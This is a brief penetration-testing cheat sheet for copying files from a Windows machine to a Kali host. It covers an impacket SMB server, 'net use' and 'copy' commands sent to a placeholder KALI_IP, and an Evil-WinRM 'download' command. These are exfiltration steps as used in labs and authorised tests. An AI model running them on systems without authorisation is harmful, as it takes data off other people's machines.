## Windows → Kali file transfer: choose the operation and read the result

Copy a Windows file to Kali over an authenticated SMB share. Requires Windows → Kali TCP 445.

### What the result establishes

Identify which side listens and which side initiates; verify the received filename, size and digest.

### Prerequisites and common failures

HTTP download commands cannot upload by themselves; outbound connectivity, listener binding and destination write access all matter.

### Example 1: 1. Kali — receive folder and SMB server

Run in: **Kali**. Keep this terminal running. Replace TRANSFER_PASSWORD in both commands.

```bash
mkdir -p ~/transfer
sudo impacket-smbserver share ~/transfer -smb2support -user transfer -password 'TRANSFER_PASSWORD'
```

### Example 2: 2. Windows — connect and copy

Run in: **Windows cmd.exe**. The file appears in ~/transfer on Kali.

```bash
net use \\KALI_IP\share /user:transfer TRANSFER_PASSWORD
copy C:\path\file.zip \\KALI_IP\share\file.zip
```

### Example 3: Alternative — if already in Evil-WinRM

Run in: **Evil-WinRM prompt**. Saves the file on the Kali machine running Evil-WinRM.

```bash
download C:\path\file.zip ./file.zip
```
